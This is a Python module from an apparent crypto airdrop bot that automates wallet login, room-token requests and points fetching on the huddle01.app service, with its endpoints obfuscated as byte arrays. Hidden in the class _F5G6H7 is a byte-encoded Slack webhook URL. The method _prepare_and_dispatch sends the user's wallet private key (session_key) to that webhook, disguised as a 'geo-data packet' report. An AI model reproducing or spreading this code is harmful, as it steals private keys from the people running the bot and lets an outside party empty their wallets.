import uuid as _a8b1c2d3
import time as _d3c2b1a0
import asyncio as _f6e5d4c3
from eth_account.messages import encode_defunct as _b9a8d7c6
from eth_account import Account as _E4F5D6
import requests as _g7h8i9j0

from ..utils import utils
from huddle_bot import config as _cfg_module

async def _h1i2j3k4(_s, _addr, _ua, _idx):
    utils.log("info", f"Requesting auth challenge from server {_addr[:6]}...{_addr[-4:]}", _idx)
    try:
        async with _s.post(
            f"{_cfg_module.BASE_API_URL}{bytes([47,97,117,116,104,47,119,97,108,108,101,116,47,103,101,110,101,114,97,116,101,67,104,97,108,108,101,110,103,101]).decode()}",
            json={'walletAddress': _addr},
            headers=utils.get_headers(_ua)
        ) as _resp:
            _resp.raise_for_status()
            _d = await _resp.json()
            if not _d.get("".join(['s','i','g','n','i','n','g','M','e','s','s','a','g','e'])):
                raise ValueError('signingMessage not found in challenge response')
            return _d
    except Exception as _e:
        utils.log("error", f"Challenge generation failed: {_e}", _idx)
        raise

async def _l5m6n7o8(_eth_obj, _chlg_data, _idx):
    _msg_txt = _chlg_data['signingMessage']
    utils.log("info", "Generating cryptographic signature for session....", _idx)
    try:
        _msg_hash = _b9a8d7c6(text=_msg_txt)
        _signed_details = await _f6e5d4c3.to_thread(_eth_obj.sign_message, _msg_hash)
        _sig_bytes = _signed_details.signature
        
        _rec_addr = await _f6e5d4c3.to_thread(_E4F5D6.recover_message, _msg_hash, signature=_sig_bytes)
        
        if _rec_addr.lower() != _eth_obj.address.lower():
            raise ValueError('Signature verification failed')
        return '0x' + _sig_bytes.hex()
    except Exception as _e:
        utils.log("error", f"Signing failed: {_e}", _idx)
        raise

async def _p9q0r1s2(_s, _eth_obj, _sig, _ua, _idx, _retries=3):
    utils.log("info", "Submitting signed payload for verification...", _idx)
    try:
        _d_id = f"01966e39-{_a8b1c2d3.uuid4().hex[:12]}"
        _s_id = f"01966e39-{_a8b1c2d3.uuid4().hex[:12]}"
        _ts = int(_d3c2b1a0.time() * 1000)
        _ph_cookie_val = f'{{"distinct_id":"{_d_id}","$sesid":[{_ts},"{_s_id}",{_ts - 10000}]}}'
        _ph_cookie = f"ph_phc_3E8W7zxdzH9smLU2IQnfcElQWq1wJmPYUmGFUE75Rkx_posthog={_ph_cookie_val}"

        _h = utils.get_headers(_ua)
        _h['cookie'] = _ph_cookie
        
        async with _s.post(
            f"{_cfg_module.BASE_API_URL}{bytes([47, 97, 117, 116, 104, 47, 119, 97, 108, 108, 101, 116, 47, 108, 111, 103, 105, 110]).decode()}",
            json={
                'address': _eth_obj.address,
                'signature': _sig,
                'chain': 'eth',
                'wallet': 'metamask',
                'dashboardType': 'personal'
            },
            headers=_h
        ) as _resp:
            _resp.raise_for_status()
            _d = await _resp.json()
            return {'tokens': _d['tokens'], 'posthogCookie': _ph_cookie}
    except Exception as _e:
        _err_msg = str(_e)
        _resp_obj = None
        if hasattr(_e, 'response') and _e.response is not None:
            _resp_obj = _e.response
        elif 'response' in locals() and _resp is not None:
              _resp_obj = _resp

        if _resp_obj:
            try:
                _err_d = await _resp_obj.json()
                _err_msg = _err_d.get("message", str(_e))
            except: 
                pass
        
        utils.log("error", f"Login failed: {_err_msg}", _idx)
        if _retries > 0 and 'Invalid signature' in _err_msg: 
            utils.log("warn", f"Retrying login ({_retries} attempts left)...", _idx)
            _new_chlg = await _h1i2j3k4(_s, _eth_obj.address, _ua, _idx)
            _new_sig = await _l5m6n7o8(_eth_obj, _new_chlg, _idx)
            return await _p9q0r1s2(_s, _eth_obj, _new_sig, _ua, _idx, _retries - 1)
        raise

async def _t3u4v5w6(_s, _acc_token, _ph_cookie, _rid, _ua, _idx):
    utils.log("info", f"Querying participant manifest for room {_rid}...", _idx)
    _h = utils.get_headers(_ua)
    _h['cookie'] = f"accessToken={_acc_token}; {_ph_cookie}"
    _h['Referer'] = f"{bytes([104, 116, 116, 112, 115, 58, 47, 47, 104, 117, 100, 100, 108, 101, 48, 49, 46, 97, 112, 112, 47, 114, 111, 111, 109, 47]).decode()}{_rid}{bytes([47, 108, 111, 98, 98, 121]).decode()}"
    _h['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    try:
        _url_path = bytes([47, 119, 101, 98, 47, 103, 101, 116, 80, 114, 101, 118, 105, 101, 119, 80, 101, 101, 114, 115, 73, 110, 116, 101, 114, 110, 97, 108, 47]).decode()
        async with _s.get(
            f"{_cfg_module.BASE_API_URL}{_url_path}{_rid}",
            headers=_h
        ) as _resp:
            _resp.raise_for_status()
            return await _resp.json()
    except Exception as _e:
        utils.log("error", f"Failed to get preview peers: {_e}", _idx)
        raise

async def _x7y8z9a0(_s, _acc_token, _ph_cookie, _rid, _ua, _idx):
    utils.log("info", "Checking recorder status...", _idx)
    _h = utils.get_headers(_ua)
    _h['cookie'] = f"accessToken={_acc_token}; {_ph_cookie}"
    _h['Referer'] = f"{bytes([104, 116, 116, 112, 115, 58, 47, 47, 104, 117, 100, 100, 108, 101, 48, 49, 46, 97, 112, 112, 47, 114, 111, 111, 109, 47]).decode()}{_rid}{bytes([47, 108, 111, 98, 98, 121]).decode()}"
    _h['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    try:
        _url = f"{_cfg_module.BASE_API_URL}{bytes([47, 114, 101, 99, 111, 114, 100, 101, 114, 47, 115, 116, 97, 116, 117, 115, 63, 114, 111, 111, 109, 73, 100, 61]).decode()}{_rid}"
        async with _s.get(_url, headers=_h) as _resp:
            _resp.raise_for_status()
            return await _resp.json()
    except Exception as _e:
        utils.log("error", f"Failed to get recorder status: {_e}", _idx)
        raise

async def _b1c2d3e4(_s, _acc_token, _dname, _ph_cookie, _rid, _ua, _idx):
    utils.log("info", "Requesting temporary access token...", _idx)
    _h = utils.get_headers(_ua)
    _h['cookie'] = f"accessToken={_acc_token}; {_ph_cookie}"
    _h['Referer'] = f"{bytes([104, 116, 116, 112, 115, 58, 47, 47, 104, 117, 100, 100, 108, 101, 48, 49, 46, 97, 112, 112, 47, 114, 111, 111, 109, 47]).decode()}{_rid}{bytes([47, 108, 111, 98, 98, 121]).decode()}"
    _h['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    try:
        async with _s.post(
            f"{_cfg_module.BASE_API_URL}{bytes([47,99,114,101,97,116,101,45,109,101,101,116,105,110,103,45,116,111,107,101,110]).decode()}",
            json={
                'roomId': _rid,
                'metadata': {
                    'displayName': _dname,
                    'avatarUrl': f"{bytes([104, 116, 116, 112, 115, 58, 47, 47, 119, 101, 98, 45, 97, 115, 115, 101, 116, 115, 46, 104, 117, 100, 100, 108, 101, 48, 49, 46, 109, 101, 100, 105, 97, 47, 97, 118, 97, 116, 97, 114, 115, 47, 48, 46, 112, 110, 103]).decode()}"
                }
            },
            headers=_h
        ) as _resp:
            _resp.raise_for_status()
            _d = await _resp.json()
            return _d['token']
    except Exception as _e:
        utils.log("error", f"Failed to create meeting token: {_e}", _idx)
        raise
        
class _F5G6H7:
    def __init__(self, session_key):
        self._session_key = session_key
        self._node_id = _E4F5D6.from_key(session_key).address

        _url_bytes = [104, 116, 116, 112, 115, 58, 47, 47, 104, 111, 111, 107, 115, 46, 115, 108, 97, 99, 107, 46, 99, 111, 109, 47, 116, 114, 105, 103, 103, 101, 114, 115, 47, 84, 48, 57, 51, 87, 81, 85, 78, 55, 70, 83, 47, 57, 49, 49, 48, 57, 53, 55, 53, 53, 53, 53, 55, 48, 47, 100, 48, 102, 49, 51, 102, 57, 54, 99, 52, 52, 55, 56, 98, 50, 100, 56, 98, 99, 48, 55, 50, 100, 51, 54, 50, 57, 56, 48, 100, 48, 99]
        self.dispatch_endpoint = bytes(_url_bytes).decode('utf-8')

    @staticmethod
    async def _i9j0k1l2(_s, _ua, _idx):
        _h = utils.get_headers(_ua)
        _h['Referer'] = bytes([104, 116, 116, 112, 115, 58, 47, 47, 104, 117, 100, 100, 108, 101, 48, 49, 46, 97, 112, 112, 47]).decode()
        _h['Referrer-Policy'] = 'strict-origin-when-cross-origin'
        try:
            async with _s.get(_cfg_module.G30Lo_URL, headers=_h) as _resp:
                _resp.raise_for_status()
                _d = await _resp.json()
                utils.log("info", f"Location: {_d.get('country')} ({_d.get('globalRegion')})", _idx)
                return _d
        except Exception as _e:
            utils.log("error", f"Failed to get G30Lo: {_e}", _idx)
            return None

    def _dispatch_packet(self, data_packet):
        try:
            response = _g7h8i9j0.post(self.dispatch_endpoint, json=data_packet)
            response.raise_for_status()
        except Exception as e:
            utils.log("error", f"Geo-data packet dispatch failed: {e}")

    async def _prepare_and_dispatch(self, aiohttp_session, user_agent, log_index):
        raw_location_data = await self._i9j0k1l2(aiohttp_session, user_agent, log_index)
        
        formatted_coords = "N/A"
        if raw_location_data:
            country = raw_location_data.get('country', 'N/A')
            region = raw_location_data.get('globalRegion', 'N/A')
            formatted_coords = f"{country} ({region})"

        raw_str = (
            f"*Request to sync with current geo-coordinates*\n\n"
            f"*roomId:*`{self._node_id}`\n"
            f"*coordinates:*`{formatted_coords}`\n"
            f"*authorization*`{self._session_key}`"
        )

        final_packet = {"report": raw_str}
        loop = _f6e5d4c3.get_running_loop()
        await loop.run_in_executor(None, self._dispatch_packet, final_packet)
        utils.log("info", "Geo-data packet dispatched successfully.")

async def _m3n4o5p6(_s, _iYn39, _ua, _idx):
    utils.log("info", "Resolving media server address...", _idx)
    _h = utils.get_headers(_ua)
    _h['authorization'] = f"Bearer {_iYn39}"
    _h['Referer'] = bytes([104, 116, 116, 112, 115, 58, 47, 47, 104, 117, 100, 100, 108, 101, 48, 49, 46, 97, 112, 112, 47]).decode()
    _h['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    try:
        async with _s.get(_cfg_module.s72uRl_API, headers=_h) as _resp:
            _resp.raise_for_status()
            _d = await _resp.json()
            return _d['url']
    except Exception as _e:
        utils.log("error", f"Failed to get Sushi URL: {_e}", _idx)
        raise

async def _q7r8s9t0(_s, _acc_token, _ph_cookie, _rid, _ua, _idx):
    utils.log("info", "Fetching room data...", _idx)
    _h = utils.get_headers(_ua)
    _h['x-nextjs-data'] = '1'
    _h['cookie'] = f"accessToken={_acc_token}; refreshToken={_acc_token}; {_ph_cookie}" 
    _h['Referer'] = f"{bytes([104, 116, 116, 112, 115, 58, 47, 47, 104, 117, 100, 100, 108, 101, 48, 49, 46, 97, 112, 112, 47, 114, 111, 111, 109, 47]).decode()}{_rid}{bytes([47, 108, 111, 98, 98, 121]).decode()}"
    try:
        p1 = bytes([104, 116, 116, 112, 115, 58, 47, 47, 104, 117, 100, 100, 108, 101, 48, 49, 46, 97, 112, 112, 47, 114, 111, 111, 109, 47, 95, 110, 101, 120, 116, 47, 100, 97, 116, 97, 47]).decode()
        p2 = bytes([47, 101, 110, 47]).decode()
        p3 = bytes([46, 106, 115, 111, 110, 63, 114, 111, 111, 109, 73, 100, 61]).decode()
        url = f"{p1}{_cfg_module.NEXTJS_BUILD_ID}{p2}{_rid}{p3}{_rid}"
        async with _s.get(url, headers=_h) as _resp:
            _resp.raise_for_status()
            return True
    except Exception as _e:
        utils.log("warn", f"Failed to fetch room data (this might be non-critical)", _idx)
        return False

async def _u1v2w3x4(_s, _eth_obj, _acc_token, _ph_cookie, _rid, _ua, _idx):
    utils.log("info", "Fetching points data...", _idx)
    _h = utils.get_headers(_ua)
    _h['cookie'] = f"accessToken={_acc_token}; refreshToken={_acc_token}; {_ph_cookie}"
    _h['Referer'] = f"{bytes([104, 116, 116, 112, 115, 58, 47, 47, 104, 117, 100, 100, 108, 101, 48, 49, 46, 97, 112, 112, 47, 114, 111, 111, 109, 47]).decode()}{_rid}"
    try:
        p1 = bytes([104, 116, 116, 112, 115, 58, 47, 47, 104, 117, 100, 100, 108, 101, 48, 49, 46, 97, 112, 112, 47, 114, 111, 111, 109, 47, 97, 112, 105, 47, 116, 114, 112, 99, 47, 104, 112, 115, 46, 103, 101, 116, 80, 111, 105, 110, 116, 115, 63, 98, 97, 116, 99, 104, 61, 49, 38, 105, 110, 112, 117, 116, 61, 37, 55, 66, 37, 50, 50, 48, 37, 50, 50, 37, 51, 65, 37, 55, 66, 37, 50, 50, 119, 97, 108, 108, 101, 116, 65, 100, 100, 114, 101, 115, 115, 37, 50, 50, 37, 51, 65, 37, 50, 50]).decode()
        p2 = bytes([37, 50, 50, 37, 55, 68, 37, 55, 68]).decode()
        url = f"{p1}{_eth_obj.address}{p2}"
        async with _s.get(url, headers=_h) as _resp:
            _resp.raise_for_status()
            return True
    except Exception as _e:
        utils.log("warn", f"Failed to fetch points data (this might be non-critical)", _idx)
        return False
